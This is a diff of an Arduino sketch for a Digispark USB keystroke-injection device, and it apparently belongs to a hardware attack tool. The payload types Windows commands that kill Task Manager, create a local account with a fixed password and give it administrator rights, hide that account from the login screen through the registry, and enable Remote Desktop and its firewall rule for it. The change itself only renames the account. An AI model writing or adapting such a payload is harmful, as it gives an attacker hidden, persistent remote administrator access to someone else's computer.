@@ -36,20 +36,20 @@ void loop() {
   //Closes Task Manager
   DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");
   DigiKeyboard.delay(500);  
-  //Creates new account and gives it Admin Access
-  DigiKeyboard.println("net user blanka Ping@123 /ADD");
+  //Creates new account under the name Henry and gives it Admin Access
+  DigiKeyboard.println("net user Henry Pass_123 /ADD");
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("net localgroup Administrators blanka /ADD");
+  DigiKeyboard.println("net localgroup Administrators Henry /ADD");
   DigiKeyboard.delay(500);
   //Hides account from login screen
-  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v blanka /t REG_DWORD /d 0 /f"));
+  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v Henry /t REG_DWORD /d 0 /f"));
   DigiKeyboard.delay(500);
   //Turns on Remote Desktop for the account
   DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));
   DigiKeyboard.delay(500);
   DigiKeyboard.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"));
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" blanka /add");
+  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" Henry /add");
   DigiKeyboard.delay(500);  
   DigiKeyboard.println("exit");
 
